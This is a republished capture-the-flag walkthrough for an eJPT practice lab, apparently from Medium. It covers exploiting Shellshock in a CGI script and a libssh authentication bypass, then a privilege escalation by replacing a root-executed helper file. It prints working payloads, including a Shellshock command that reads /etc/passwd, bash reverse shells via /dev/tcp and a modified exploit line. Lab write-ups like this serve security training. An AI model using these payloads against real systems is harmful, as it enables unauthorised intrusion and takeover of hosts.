# :game_die: Walkthrough - Host & Network Penetration Testing: System-Host Based Attacks CTF 2

> **Original Source:** [Walkthrough - Host & Network Penetration Testing: System-Host Based Attacks CTF 2](https://infosecwriteups.com/host-network-penetration-testing-system-host-based-attacks-ctf-2-18f1e52fcea4)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Walkthrough - Host & Network Penetration Testing: System-Host Based Attacks CTF 2


Hey folks!
In this post, I’m walking you through EJPT CTF-6 (System-Host Based Attacks 2) how I tackled it, my mostly manual approach, and how I hunted down all four flags. No flag leaks here this is about learning, not spoon-feeding. Instead, I’ll share my thought process, tools, and commands used to crack the box.


Let’s dive in!

## Initial Recon: Scanning for Open Ports


This lab has 2 machine, so we will first exploit machine1 and then work our way to machine2:
target1.ine.local
target2.ine.local


- Flag 1: Check the root (‘/’) directory for a file that might hold the key to the first flag on target1.ine.local.


First thing first, which is NMAP and the result was found only one port 80 open and it was not vulnerable as a result from nmap scan


```
nmap -sV --script vuln <target>
```


So, I hopped on to the browser and on the home page I saw .cgi script extension and it clicked to me about the Shellshock lab, so I went into my notes and got the special characters list to bypass it.


```
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```


This will basically execute commands and test out if its vulnerable to command injection or not.


So I fired up my Burpsuite, changed the browser proxy to burp using foxyproxy. Refreshed the browser captured the packet, sent it to repeater removed the information from User-Agent line and replaced it with above command. Now, from the burp repeater result we can see that it is vulnerable to command injection as it cats out the password file so we will try to execute a bash session and setup our listener using netcat.


```
#listner on terminal
nc -nvlp 1234

#command to put in proxy packet
() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<your ip>/1234 0>&1'
```


So, I setup my netcat listener on port 1234 and again refreshed the browser put the above one liner and got a reverse connection. Now if you move to the root directory (as given in the question) you will find your first flag and just cat it out.


- Flag 2: In the server’s root directory, there might be something hidden. Explore ‘/opt/apache/htdocs/’ carefully to find the next flag on target1.ine.local.


Now coming to the second flag the path is already given so go there and again cat out the flag.


What you didn’t find it, just use your little linux skills and it will workout (list all), try again.


Still no flag, no issue the flag is there its just hidden so we need to list out all the files in it by using the list all command in the linux terminal.


```
ls -al
cat .flag2.txt
```


Now, our first machine is solved moving on to next one again you know the drill nmap.


#note: you can also use metasploit apache_mod_cgi module too if you want but I like more manual approach as this is a learning process.


- Flag 3: Investigate the user’s home directory and consider using ‘libssh_auth_bypass’ to uncover the flag on target2.ine.local.


Again, we find only one port that is open and by seeing the service I used searchsploit to see if it vulnerable to any exploit and by looking at the question you can guess it there is a public exploit available.


## Get Mohammed Ali Mistry’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


So, as a noob I tried to copy the exploit and run it, but but but it didn't worked so I had to improvise. I opened the code using mousepad and after trying to understand it I get that its not executing a bash shell and we wont get any reverse shell nor does this code give us a shell after executing . So using one liners for bash reverse shell I tried to execute that code again.


```
#search for exploit
searchsploit libssh

#copy the exploit in your current directory
searchsploit -m <exploit id>

#open the file using mousepad
mousepad <exploit>.py

#replace this with line 30 in the exploit code of
spawncmd.exec_command("bash -i >& /dev/tcp/YOUR-IP/4444 0>&1")
```


Now, again setup a listener on port 4444 using netcat and execute the code again


```
#listner
nc -nvlp 4444

#exploit
python <exploit.py> --host <target ip> --port 22 --logfile new.txt

#if you encounter paramiko error just use this and try to execute above command once again
pip install paramiko
```


Now, when you get the bash shell go to the home directory and you will find your flag and just cat it out.


- Flag 4: The most restricted areas often hold the most valuable secrets. Look into the ‘/root’ directory to find the hidden flag on target2.ine.local.


Now coming to our last flag, and as the question suggest to go to the root directory where we will find our flag. So I did but, I was denied permission on it, I tried su but it didn't work and I got frustrated trying different things but then I remembered that in the home directory there was a welcome file, so I quickly went there and checked it out.


And I can’t cat it out, can’t read what’s inside so I checked their permissions and found something interesting, that the welcome file had an executable permission. Again I tried to cat it out but it didn't worked.


Now again after multiple attempts to cat it out and in the end it worked and it was gibberish so I tried strings and it gave me something readable but still gibberish to me. So I went to chatgpt but it failed to explain it to me but I got the rough idea that its an executable bash file. So I tried looking at it and I found something interesting that this executable was using greetings which was another file in that same directory.


And I checked the permissions again and we got to know that we can’t open or execute this file only the root user can. But hey we can use this file to privilege escalate ourselves somehow.


So I deleted that file created a new file with the same name and since this file has the executable permission on root and we recreated this file again so we become its owner automatically and now we can change its permission too.


```
#delete greetings file
rm greetings

#create new file and put bash shell to execute
echo "/bin/bash -i" > greetings

#change permission to make it executable
chmod +x greetings

#now execute welcome file and we will have a bash shell
./welcome
```


Now if you list files you will have your 4th flag, just cat it out and your done with another CTF lab.


#note: you can also use metasploit module libssh_auth_bypass for more automated approach.


Hurray we got all the flags, congratulations. Also let me know in the comment box what do you guys think.
Happy hacking!


Also, checkout my previous EJPT-CTF blogs and do share, like and follow me for more such updates.


---

*Originally published on [Medium](https://infosecwriteups.com/host-network-penetration-testing-system-host-based-attacks-ctf-2-18f1e52fcea4). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
